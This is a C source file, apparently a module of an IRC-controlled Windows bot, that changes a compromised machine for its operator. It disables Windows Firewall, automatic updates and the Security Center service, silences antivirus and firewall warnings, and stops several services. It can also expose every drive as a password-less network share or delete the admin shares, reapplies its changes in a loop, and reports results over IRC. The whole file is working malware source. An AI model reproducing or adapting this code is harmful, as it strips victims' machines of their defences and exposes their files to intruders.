#include "includes.h"
#include "functions.h"

#ifndef NO_SECURE

char *stoplist[] = { "Tlntsvr",	"RemoteRegistry",	"Messenger", "SharedAccess",		 "wscsvc" };
char *stopnames[]= { "Telnet",	"Remote Registry",	"Messenger", "Windows Firewall/ICS", "Security Center" };

REGENT SecureReg[]={
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"UpdatesDisableNotify",		REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"AntiVirusDisableNotify",	REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"FirewallDisableNotify",	REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"AntiVirusOverride",		REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Security Center",										"FirewallOverride",			REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile",			"EnableFirewall",			REG_DWORD,	0x00000000,	0x00000001},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile",			"EnableFirewall",			REG_DWORD,	0x00000000,	0x00000001},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WindowsUpdate\\Auto Update",	"AUOptions",				REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\wscsvc",								"Start",					REG_DWORD,	0x00000004,	0x00000002},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\TlntSvr",								"Start",					REG_DWORD,	0x00000004, 0x00000003},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\RemoteRegistry",						"Start",					REG_DWORD,	0x00000004, 0x00000002},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\Messenger",							"Start",					REG_DWORD,	0x00000004, 0x00000004},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Lsa",									"restrictanonymous",		REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters",			"AutoShareWks",				REG_DWORD,	0x00000000, 0x00000001},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters",			"AutoShareServer",			REG_DWORD,	0x00000000, 0x00000001},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\lanmanworkstation\\parameters",		"AutoShareWks",				REG_DWORD,	0x00000000, 0x00000001},
	{HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Services\\lanmanworkstation\\parameters",		"AutoShareServer",			REG_DWORD,	0x00000000, 0x00000001},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate",					"DoNotAllowXPSP2",			REG_DWORD,	0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"Software\\Microsoft\\OLE",													"EnableDCOM",				REG_SZ,		0x00000000, 0x00000000, "N", "Y"},
	/*{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1001",				 0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1004",				 0x00000001, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1200",				 0x00000000, 0x00000000},
	{HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1809",				 0x00000003, 0x00000000},
	{HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1001",				 0x00000001, 0x00000000},
	{HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1004",				 0x00000001, 0x00000000},
	{HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1200",				 0x00000000, 0x00000000},
	{HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones",	"1809",				 0x00000003, 0x00000000}*/
};

NETSHARES ShareList[]={
	{(LPTSTR)L"IPC$",NULL},
	{(LPTSTR)L"ADMIN$",NULL},
	{(LPTSTR)L"C$",(LPTSTR)L"C:\\"},{(LPTSTR)L"D$",(LPTSTR)L"D:\\"},
	{(LPTSTR)L"E$",(LPTSTR)L"E:\\"},{(LPTSTR)L"F$",(LPTSTR)L"F:\\"},
	{(LPTSTR)L"G$",(LPTSTR)L"G:\\"},{(LPTSTR)L"H$",(LPTSTR)L"H:\\"},
	{(LPTSTR)L"I$",(LPTSTR)L"I:\\"},{(LPTSTR)L"J$",(LPTSTR)L"J:\\"},
	{(LPTSTR)L"J$",(LPTSTR)L"J:\\"},{(LPTSTR)L"K$",(LPTSTR)L"K:\\"},
	{(LPTSTR)L"L$",(LPTSTR)L"L:\\"},{(LPTSTR)L"M$",(LPTSTR)L"M:\\"},
	{(LPTSTR)L"N$",(LPTSTR)L"N:\\"},{(LPTSTR)L"O$",(LPTSTR)L"O:\\"},
	{(LPTSTR)L"P$",(LPTSTR)L"P:\\"},{(LPTSTR)L"Q$",(LPTSTR)L"Q:\\"},
	{(LPTSTR)L"R$",(LPTSTR)L"R:\\"},{(LPTSTR)L"S$",(LPTSTR)L"S:\\"},
	{(LPTSTR)L"T$",(LPTSTR)L"T:\\"},{(LPTSTR)L"U$",(LPTSTR)L"U:\\"},
	{(LPTSTR)L"V$",(LPTSTR)L"V:\\"},{(LPTSTR)L"W$",(LPTSTR)L"W:\\"},
	{(LPTSTR)L"X$",(LPTSTR)L"X:\\"},{(LPTSTR)L"Y$",(LPTSTR)L"Y:\\"},
	{(LPTSTR)L"Z$",(LPTSTR)L"Z:\\"}
};

void SecureRegistry(BOOL secure, void *conn, char *target, BOOL silent, BOOL verbose, BOOL loop)
{
	IRC* irc=(IRC*)conn;

	int written=0,failed=0;
	for(int i=0;i < (sizeof(SecureReg)/sizeof(*SecureReg));i++)
	{
		if (SecureReg[i].type==REG_DWORD)
		{
			if (RegWrite(SecureReg[i].hkey, SecureReg[i].subkey, SecureReg[i].name, (secure?SecureReg[i].data1:SecureReg[i].data2)))
			{
				written++;
				if (!loop && verbose && !silent)
					irc->privmsg(target,"%s Set \"%s\\%s\\%s\" to \"%d\".",(secure?sec_title:unsec_title),(SecureReg[i].hkey==HKEY_LOCAL_MACHINE?"HKLM":"HKCU"),SecureReg[i].subkey,SecureReg[i].name,(secure?SecureReg[i].data1:SecureReg[i].data2));
			}
			else
			{
				failed++;
				if (!loop && verbose && !silent)
					irc->privmsg(target,"%s Failed to set \"%s\\%s\\%s\" to \"%d\".",(secure?sec_title:unsec_title),(SecureReg[i].hkey==HKEY_LOCAL_MACHINE?"HKLM":"HKCU"),SecureReg[i].subkey,SecureReg[i].name,(secure?SecureReg[i].data1:SecureReg[i].data2));
			}
		}
		else if (SecureReg[i].type==REG_SZ)
		{
			written++;
			if (RegWrite(SecureReg[i].hkey, SecureReg[i].subkey, SecureReg[i].name, (secure?SecureReg[i].sdata1:SecureReg[i].sdata2)))
			{
				if (!loop && verbose && !silent)
					irc->privmsg(target,"%s Set \"%s\\%s\\%s\" to \"%s\".",(secure?sec_title:unsec_title),(SecureReg[i].hkey==HKEY_LOCAL_MACHINE?"HKLM":"HKCU"),SecureReg[i].subkey,SecureReg[i].name,(secure?SecureReg[i].sdata1:SecureReg[i].sdata2));
			}
			else
			{
				failed++;
				if (!loop && verbose && !silent)
					irc->privmsg(target,"%s Failed to set \"%s\\%s\\%s\" to \"%s\".",(secure?sec_title:unsec_title),(SecureReg[i].hkey==HKEY_LOCAL_MACHINE?"HKLM":"HKCU"),SecureReg[i].subkey,SecureReg[i].name,(secure?SecureReg[i].sdata1:SecureReg[i].sdata2));
			}
		}
	}
	if (written==0)
	{
		if (!verbose && !silent && !loop)
			irc->privmsg(target,"%s Failed to %s Registry. (%.2d/%.2d)",(secure?sec_title:unsec_title),(secure?"secured":"unsecured"),written,failed);
	}
	else
	{
		if (!verbose && !silent && !loop)
			irc->privmsg(target,"%s Registry %s. (%.2d/%.2d)",(secure?sec_title:unsec_title),(secure?"secured":"unsecured"),written,failed);
	}
}

void SecureShares(BOOL secure, void *conn, char *target, BOOL silent, BOOL verbose, BOOL loop)
{
	IRC* irc=(IRC*)conn;
	char sendbuf[IRCLINE];
	char tmpBuffer[IRCLINE];
	int shdel=0;
	int shmake=0;

	if (secure)
	{
		PSHARE_INFO_502 pBuf,p;
		NET_API_STATUS nStatus;
		DWORD entriesread=0,totalread=0,resume=0;
			
		if (!loop && !silent)
			sprintf(sendbuf,"%s Shares %s:",sec_title,"erased");

		do
		{
			nStatus=fNetShareEnum(NULL,502,(LPBYTE *)&pBuf,-1,&entriesread,&totalread,&resume);

			if(nStatus == ERROR_SUCCESS || nStatus == ERROR_MORE_DATA)
			{
				p = pBuf;
 
				for(unsigned int i=1;i <= entriesread;i++)
				{
					if (p->shi502_netname[wcslen(p->shi502_netname)-1] == '$')
					{
						if(fNetShareDel(NULL,(unsigned short *)p->shi502_netname,0) == NERR_Success)
						{
							if (!loop && !silent && verbose)
							{
								if (shdel>0)
									strcat(sendbuf,",");
								sprintf(tmpBuffer," %S",p->shi502_netname);
								strcat(sendbuf,tmpBuffer);
							}
							shdel++;
						}
					}
					p++;
				}
				fNetApiBufferFree(pBuf);
			}
			else
			{
				for(int i=0;i < (sizeof(ShareList)/sizeof(*ShareList));i++)
				{
					if(fNetShareDel(NULL,(unsigned short *)ShareList[i].ShareName,0) == NERR_Success)
					{
						if (!loop && !silent && verbose)
						{
							if (shdel>0)
								strcat(sendbuf,",");

							sprintf(tmpBuffer," %S",ShareList[i].ShareName);
							strcat(sendbuf,tmpBuffer);
						}
						shdel++;
					}
				}
			}
		} while (nStatus == ERROR_MORE_DATA);

		if (verbose && !loop && !silent)
		{
			if (shdel==0)
				irc->privmsg(target,"%s No shares %s.",sec_title,"erased");
			else
			{
				sprintf(tmpBuffer," - Total shares %s: %d.","erased",shdel);
				strcat(sendbuf,tmpBuffer);
				irc->privmsg(target,sendbuf);
			}
		}
		else if (!loop && !silent && !verbose)
		{
			if (shdel==0)
				irc->privmsg(target,"%s No shares %s.",sec_title,"erased");
			else
			{
				irc->privmsg(target,"%s Total shares %s: %d.",sec_title,"erased",shdel);
			}
		}

	}
	else
	{ // Unsecure

		if (!loop && !silent)
			sprintf(sendbuf,"%s Shares %s:",unsec_title,"created");

		NET_API_STATUS res;
		SHARE_INFO_2 p;
		DWORD parm_err = 0;
		for (int i=0;i < (sizeof(ShareList) / sizeof (*ShareList));i++)
		{
			p.shi2_netname = (unsigned short *)TEXT(ShareList[i].ShareName);   
			p.shi2_type = STYPE_DISKTREE;
			p.shi2_remark = (unsigned short *)TEXT("rofl");
			p.shi2_permissions = 0;
			p.shi2_max_uses = 4;
			p.shi2_current_uses = 0;
			p.shi2_path = (unsigned short *)TEXT(ShareList[i].SharePath);
			p.shi2_passwd = NULL;
			res=fNetShareAdd(NULL,2,(LPBYTE)&p,&parm_err);
			if(res==0)
			{
				if (!loop && !silent && verbose)
				{
					if (shmake>0)
						strcat(sendbuf,",");

					sprintf(tmpBuffer," %S",ShareList[i].ShareName);
					strcat(sendbuf,tmpBuffer);
				}
				shmake++;
			}
		}
		if (verbose && !loop && !silent)
		{
			if (shmake==0)
				irc->privmsg(target,"%s No shares %s.",unsec_title,"created");
			else
			{
				sprintf(tmpBuffer," - Total shares %s: %d.","created",shmake);
				strcat(sendbuf,tmpBuffer);
				irc->privmsg(target,sendbuf);
			}
		}
		else if (!verbose && !silent && !loop)
		{
			if (shmake==0)
				irc->privmsg(target,"%s No shares %s.",unsec_title,"created");
			else
			{
				irc->privmsg(target,"%s Total shares %s: %d.",unsec_title,"created",shmake);
			}
//			addlog(MAINLOG,sendbuf);
		}
	}
	return;
}

void SecureServices(void *conn, char *target, BOOL silent, BOOL verbose, BOOL loop)
{
	IRC* irc=(IRC*)conn;
	SERVICE_STATUS ssStatus; 
	SC_HANDLE schService;
	SC_HANDLE hServiceControl;
	DWORD fdwAccess; 
	DWORD fdwControl;
	// The required service object access depends on the control. 
	fdwControl = SERVICE_CONTROL_STOP;
	fdwAccess = SERVICE_STOP;
	int stopped=0;
	int stopsize=(sizeof(stoplist)/sizeof(LPTSTR));

//	char sendbuf[IRCLINE];
	for(int x=0;x<stopsize;x++)
	{
 		// Open a handle to the service.
		hServiceControl=fOpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
		schService=fOpenService(hServiceControl,stoplist[x],SERVICE_ALL_ACCESS);
		if (schService == NULL)
		{
			DWORD dw = GetLastError();
			if ((int)dw == 1060)
				if (verbose && !loop && !silent)
					irc->privmsg(target,"%s The %s service does not exist.",sec_title,stopnames[x]);
		}
		else
		{ 
			if (fControlService(schService, SERVICE_CONTROL_STOP, &ssStatus))
			{
				fControlService(schService, SERVICE_CONTROL_STOP, &ssStatus);
				if (verbose && !loop && !silent)
					irc->privmsg(target,"%s %s service stopped.",sec_title,stopnames[x]);
				stopped++;
			}
			else
			{
				DWORD dw = GetLastError();
				if ((int)dw == 1062)
					if (verbose && !loop && !silent)
						irc->privmsg(target,"%s The %s service was not started.",sec_title,stopnames[x]);

				else
					if (verbose && !loop && !silent)
						irc->privmsg(target,"%s Failed to stop the %s service, error: <%d> %u",sec_title,stopnames[x],dw);
			}
		}
		fCloseServiceHandle(schService);
		fCloseServiceHandle(hServiceControl);
	}
	if (stopped==0)
	{
		if (!loop && !silent && !verbose)
			irc->privmsg(target,"%s No services stopped.",sec_title);
	}
	else
	{
		if (!loop && !silent && !verbose)
			irc->privmsg(target,"%s Total services stopped: %d",sec_title,stopped);
	}
}


DWORD WINAPI SecureThread(LPVOID param)
{
	NTHREAD secure = *((NTHREAD*)param);
	NTHREAD *secures = (NTHREAD *)param;
	secures->gotinfo = TRUE;

	if (secure.bdata2) //loop
	{
		while (1)
		{
			if (!noadvapi32)
			{
				SecureServices(NULL, 0, TRUE, FALSE, TRUE);
				SecureRegistry(TRUE, NULL, 0, TRUE, FALSE, TRUE);
				SecureShares(TRUE, NULL, 0, TRUE, FALSE, TRUE);
			}
			//WriteHostsFile(secure.secure, secure.sock, secure.chan, secure.notice, secure.silent, secure.verbose, secure.loop);
			Sleep(SECURE_DELAY);
		}
	}
	else
	{
		IRC* irc=(IRC*)secure.conn;
		if (!noadvapi32)
		{
			if (secure.bdata1)
			{
				SecureServices(irc,secure.target,secure.silent,secure.verbose,FALSE);
			}

			SecureRegistry(secure.bdata1,irc,secure.target,secure.silent,secure.verbose,FALSE);
			SecureShares(secure.bdata1,irc,secure.target,secure.silent,secure.verbose,FALSE);
		}
			
	}

/*
		} else {
//			sprintf(sendbuf,"%s Advapi32.dll could not be loaded, %s could not be %s.",(secure.secure?sec_title:unsec_title),(secure.secure?"registry, shares, and services":"registry and shares"),(secure.secure?"secured":"unsecured"));
//			if (!secure.silent) irc_privmsg(secure.sock,secure.chan,sendbuf,secure.notice);
//			addlog(MAINLOG,sendbuf);
		}
//		WriteHostsFile(secure.secure, secure.sock, secure.chan, secure.notice, secure.silent, secure.verbose, secure.loop);
	}
*/
	clearthread(secure.threadnum);
	ExitThread(0);
}
#endif